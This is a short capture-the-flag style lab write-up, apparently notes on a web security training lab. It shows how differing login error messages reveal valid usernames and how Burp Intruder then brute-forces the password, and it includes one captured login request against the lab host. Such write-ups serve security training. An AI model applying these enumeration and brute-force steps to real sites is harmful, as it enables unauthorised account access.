---
tags:
  - authn
  - username-enum
---
# Username enumeration via different responses

1. Try logging in with generic credentials like `tester:password` and notice the response contains the string "Invalid username"
2. Send the login request to intruder and set a placeholder on the username
3. Run the attack and filter by responses that do not contain that string
4. Notice the following request does not result in the common error

```
POST /login HTTP/1.1
Host: 0aeb001104ec463c82f78345004700df.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0aeb001104ec463c82f78345004700df.web-security-academy.net
Connection: close
Referer: https://0aeb001104ec463c82f78345004700df.web-security-academy.net/login
Cookie: session=zr9XUeC8t6mXRGjonvw17G8t3c1bgkDa
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue
Priority: u=0, i

username=affiliate&password=password
```

5. Now we can brute force the password for that user
6. Note that incorrect attempts contain the message "Incorrect password"

![[attachments/authn-lab-1/file-20260204160246891.png]]

7. Log in with the recovered password to solve the lab

